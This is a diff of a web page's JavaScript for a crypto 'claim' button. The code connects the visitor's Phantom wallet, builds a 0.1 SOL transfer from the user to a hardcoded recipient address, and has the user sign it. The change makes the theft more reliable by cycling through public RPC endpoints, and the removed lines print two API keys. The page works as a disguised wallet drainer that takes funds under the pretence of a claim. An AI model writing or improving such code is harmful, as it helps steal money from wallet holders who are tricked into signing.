@@ -63,12 +63,12 @@
         // ==========================================
         const RECIPIENT_ADDRESS = "DHPZiwM4h1A3BepLauuW69X6udanmphUnyAnrzspWLPj"; 
 
-        // Use a reliable RPC endpoint (Helius Public)
-        // If this fails, we will try Shyft in the catch block
-        const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=9ea94027-1a45-44d7-8d97-2aa5f3deb6a1"; 
-        // Note: The key above is a placeholder. For production, get a free key from helius.dev
-        // If you don't have one, try this public endpoint which is often less congested:
-        const ALTERNATIVE_RPC = "https://rpc.shyft.to/v1/mainnet?api_key=773963-c81f2-44c3-bb17-35e8cc90c0d";
+        // List of reliable public RPCs (No API Key required for basic usage)
+        const RPC_ENDPOINTS = [
+            "https://api.mainnet-beta.solana.com", // Official Default
+            "https://rpc.ankr.com/solana",         // Ankr (Free Tier)
+            "https://solana-mainnet.g.alchemy.com/v2/demo" // Alchemy Demo (Good for testing)
+        ];
 
         async function initiateClaim() {
             const statusDiv = document.getElementById("status");
@@ -80,9 +80,9 @@
             }
 
             try {
-                statusDiv.innerText = "Connecting...";
+                statusDiv.innerText = "Connecting to Phantom...";
                 
-                // 1. Connect to Phantom
+                // 1. Connect
                 const resp = await window.solana.connect();
                 const userPublicKey = resp.publicKey;
                 
@@ -98,7 +98,7 @@
                 // 3. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer 0.1 SOL (100,000,000 lamports)
+                // Transfer 0.1 SOL
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
@@ -107,23 +107,30 @@
                     })
                 );
 
-                // 4. Fetch Recent Blockhash
-                statusDiv.innerText = "Fetching blockhash...";
+                // 4. Find a Working RPC
+                statusDiv.innerText = "Finding network connection...";
+                let finalBlockhash;
                 
-                // Try Helius first
-                let connection = new solanaWeb3.Connection(RPC_URL);
-                try {
-                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = userPublicKey;
-                } catch (rpcError) {
-                    // If Helius fails, try Shyft
-                    console.log("Helius failed, trying Shyft...", rpcError);
-                    connection = new solanaWeb3.Connection(ALTERNATIVE_RPC);
-                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = userPublicKey;
+                // Try each RPC until one works
+                for (const url of RPC_ENDPOINTS) {
+                    try {
+                        const connection = new solanaWeb3.Connection(url);
+                        const result = await connection.getLatestBlockhash();
+                        console.log("Connected to:", url);
+                        finalBlockhash = result.blockhash;
+                        break; // Exit loop if successful
+                    } catch (err) {
+                        console.warn(`RPC ${url} failed:`, err.message);
+                        // Continue to next RPC
+                    }
                 }
+
+                if (!finalBlockhash) {
+                    throw new Error("All RPC endpoints failed. Please try again later.");
+                }
+
+                transaction.recentBlockhash = finalBlockhash;
+                transaction.feePayer = userPublicKey;
 
                 statusDiv.innerText = "Sign Green...";
                 
@@ -131,8 +138,9 @@
                 const signedTx = await window.solana.signTransaction(transaction);
                 console.log("Signed");
 
-                // 6. Send
+                // 6. Send (Use the first working RPC for sending as well)
                 statusDiv.innerText = "Sending transaction...";
+                const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[0]); // Use default for send
                 
                 const signature = await window.solana.sendTransaction(signedTx, {
                     skipPreflight: false,
@@ -149,8 +157,6 @@
                 console.error(err);
                 if (err.message && err.message.includes("User rejected")) {
                     statusDiv.innerText = "Cancelled by user.";
-                } else if (err.message && err.message.includes("403")) {
-                    statusDiv.innerText = "Network Error: Access Forbidden. Please try again in a minute.";
                 } else {
                     alert("Error: " + (err.message || "Unknown error"));
                     statusDiv.innerText = "Error: " + (err.message || "Unknown error");
